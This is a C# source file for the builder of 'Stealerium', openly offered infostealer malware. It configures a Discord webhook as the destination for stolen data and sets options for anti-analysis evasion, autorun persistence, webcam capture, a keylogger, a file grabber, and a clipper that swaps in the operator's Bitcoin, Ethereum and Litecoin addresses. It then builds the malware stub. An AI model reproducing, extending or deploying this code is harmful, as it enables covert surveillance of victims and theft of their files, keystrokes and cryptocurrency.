using Builder.Modules;
using Builder.Modules.build;

namespace Builder;

internal class Program
{
    [STAThread]
    private static void Main()
    {
        // Settings
        var token = Cli.GetStringValue("Discord webhook url");
        // Test connection to Discord webhook url
        if (!Discord.WebhookIsValid(token))
            Cli.ShowError("Check the fucking webhook url!");
        else
            Discord.SendMessage("✅ *Stealerium* builder connected successfully!", token);
        Cli.ShowSuccess("Connected successfully!\n");

        // Encrypt values
        Build.ConfigValues["Webhook"] = Crypt.EncryptConfig(token);
        // Debug mode (write all exceptions to file)
        Build.ConfigValues["Debug"] = Cli.GetBoolValue("Debug all exceptions to file ?");
        // Installation
        Build.ConfigValues["AntiAnalysis"] = Cli.GetBoolValue("Use anti analysis?");
        Build.ConfigValues["Startup"] = Cli.GetBoolValue("Install autorun?");
        Build.ConfigValues["StartDelay"] = Cli.GetBoolValue("Use random start delay?");
        // Modules
        if (Build.ConfigValues["Startup"].Equals("1"))
        {
            Build.ConfigValues["WebcamScreenshot"] = Cli.GetBoolValue("Create webcam screenshots?");
            Build.ConfigValues["Keylogger"] = Cli.GetBoolValue("Install keylogger?");
            Build.ConfigValues["Clipper"] = Cli.GetBoolValue("Install clipper?");
        }

        Build.ConfigValues["Grabber"] = Cli.GetBoolValue("File Grabber ?");

        // Clipper addresses
        if (Build.ConfigValues["Clipper"].Equals("1"))
        {
            Build.ConfigValues["ClipperBTC"] = Cli.GetEncryptedString("Clipper : Your bitcoin address");
            Build.ConfigValues["ClipperETH"] = Cli.GetEncryptedString("Clipper : Your etherium address");
            Build.ConfigValues["ClipperLTC"] = Cli.GetEncryptedString("Clipper : Your litecoin address");
        }

        // Build
        var build = Build.BuildStub();

        // Done
        Cli.ShowSuccess("Stub: " + build + " saved.");
        Console.ReadLine();
    }
}